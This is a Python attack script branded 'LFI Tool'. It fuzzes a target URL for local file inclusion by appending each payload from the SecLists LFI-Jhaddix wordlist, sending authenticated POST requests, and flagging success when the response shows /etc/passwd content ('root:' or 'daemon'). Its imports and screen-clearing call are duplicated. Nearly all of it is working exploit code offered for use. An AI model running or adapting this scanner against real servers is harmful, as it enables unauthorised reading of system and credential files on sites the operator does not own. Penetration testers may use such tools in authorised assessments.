import requests
from threading import Thread
import sys
import os
from pwn import *

os.system("clear")


import requests
from threading import Thread
import sys
from pwn import *

os.system("clear")


print("""\033[1;32m
                                                                                                     
                                                                                                     
                                                                                                     
               █████       ███████████ █████    ███████████                   ████                  
              ░░███       ░░███░░░░░░█░░███    ░█░░░███░░░█                  ░░███                  
               ░███        ░███   █ ░  ░███    ░   ░███  ░   ██████   ██████  ░███                  
               ░███        ░███████    ░███        ░███     ███░░███ ███░░███ ░███                  
               ░███        ░███░░░█    ░███        ░███    ░███ ░███░███ ░███ ░███                  
               ░███      █ ░███  ░     ░███        ░███    ░███ ░███░███ ░███ ░███                  
               ███████████ █████       █████       █████   ░░██████ ░░██████  █████                 
              ░░░░░░░░░░░ ░░░░░       ░░░░░       ░░░░░     ░░░░░░   ░░░░░░  ░░░░░                  
                                                                                                     
                          \033[1;37m Coder By EL Jihad Youssef
    """)

def Local_File_Inclusion():
    if len(sys.argv) != 3:
        print("\033[1;31m Usage: python script.py http://www.example.com login=test%2Ftest")
        sys.exit(1)

    target_url = sys.argv[1]
    cookies_str = sys.argv[2]
    cookies = dict(x.split('=') for x in cookies_str.split(';'))

    Path = open('/usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt', 'r')

    for Files in Path:
        File = Files.rstrip('\n')
        URL = f"{target_url}{File}"
        with log.progress('\033[1;37mTrying Payload In Url ...') as p:
            Response = requests.post(URL, cookies=cookies).text
            S_code = requests.post(URL, cookies=cookies).status_code

            if "root:" in Response or "daemon" in Response:
                p.success("\033[1;32mLocal File Inclusion Found : %s" % URL)
                print("")
                break
            else:
                p.failure("\033[1;31m %s"% URL)
                print('')
                # Afficher le code d'état si nécessaire
                # print(f"\033[1;37m Status_code IS \033[1;33m[{S_code}]")
                continue

    print(Response)
    print(f"\033[1;33mStatus_Code Is {S_code}")

S = Thread(target=Local_File_Inclusion)
S.start()
S.join()
